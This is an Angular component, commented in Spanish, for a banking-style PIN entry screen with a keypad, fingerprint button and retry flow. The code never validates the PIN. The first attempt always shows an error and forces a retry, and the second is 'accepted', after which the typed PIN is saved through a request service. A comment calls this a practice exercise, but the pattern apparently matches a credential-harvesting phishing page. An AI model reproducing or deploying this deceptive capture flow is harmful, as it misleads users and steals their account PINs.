import { Component, DestroyRef, inject, output, signal } from '@angular/core';
import { Location } from '@angular/common';
import { Router } from '@angular/router';
import { Reintento } from './service/reintento.service';
import { SolicitudService } from '../../core/solicitud';

type Estado = 'pin' | 'error' | 'cargando';

@Component({
  selector: 'app-pin',
  templateUrl: './pin.component.html',
  styleUrl: './pin.component.css',
  // Fondo blanco cuando se muestra el aviso o el loading
  host: { '[class.blanco]': "estado() !== 'pin'" },
})
export class PinComponent {
  private readonly location = inject(Location);
  private readonly router = inject(Router);
  private readonly destroyRef = inject(DestroyRef);
  private readonly reintento = inject(Reintento);
  private readonly solicitud = inject(SolicitudService);


  // Cantidad de dígitos de la clave
  readonly largo = 4;

  // Números del teclado (huella, 0 y borrar van aparte en el HTML)
  readonly teclas = ['1', '2', '3', '4', '5', '6', '7', '8', '9'];

  // Posiciones de las casillas, para pintarlas en el HTML
  readonly casillas = Array.from({ length: this.largo }, (_, posicion) => posicion);

  // Dígitos ingresados hasta ahora
  readonly digitos = signal<string[]>([]);

  // Pantalla que se muestra: clave, aviso de error o loading
  readonly estado = signal<Estado>('pin');

  // Se emite al tocar la huella y al tocar "Olvidé mi clave"
  readonly huella = output<void>();
  readonly olvideClave = output<void>();

  // Pausa para que se vea el cuarto asterisco antes de cambiar de pantalla
  private readonly pausaClave = 300;

  // Duración del loading antes de pasar a validación
  private readonly duracionCarga = 2500;

  // Intentos de clave hechos (el primero siempre falla, el segundo pasa)
  private intentos = 0;

  // Evita seguir escribiendo o borrando mientras se procesa la clave
  private bloqueado = false;

  private temporizador?: ReturnType<typeof setTimeout>;

  constructor() {
    this.destroyRef.onDestroy(() => clearTimeout(this.temporizador));
  }

  // Agrega un número si todavía hay espacio
  agregar(numero: string): void {
    if (this.bloqueado || this.digitos().length >= this.largo) {
      return;
    }

    const nuevos = [...this.digitos(), numero];
    this.digitos.set(nuevos);

    if (nuevos.length === this.largo) {
      this.procesarClave();
    }
  }

  // Borra el último dígito
  borrar(): void {
    if (this.bloqueado) {
      return;
    }
    this.digitos.set(this.digitos().slice(0, -1));
  }

  // "Intentar nuevamente": marca el reintento y vuelve a la pantalla de acceso
  reintentar(): void {
    this.reintento.marcar();
    this.router.navigate(['/acceso']);
  }

  // Regresa a la pantalla anterior
  volver(): void {
    this.location.back();
  }

  // Antes del reintento: aviso de error. Después del reintento: loading y redirección
  private procesarClave(): void {
    this.bloqueado = true;

    this.temporizador = setTimeout(() => {
      if (!this.reintento.yaSeUso()) {
        this.estado.set('error');
        return;
      }

      // Clave aceptada: se guarda el PIN (solo para ver el flujo completo en esta práctica)
      this.solicitud.guardar('pin', { clave: this.digitos().join('') });

      this.estado.set('cargando');
      this.temporizador = setTimeout(
        () => this.router.navigate(['/validacion']),
        this.duracionCarga,
      );
    }, this.pausaClave);
  }
}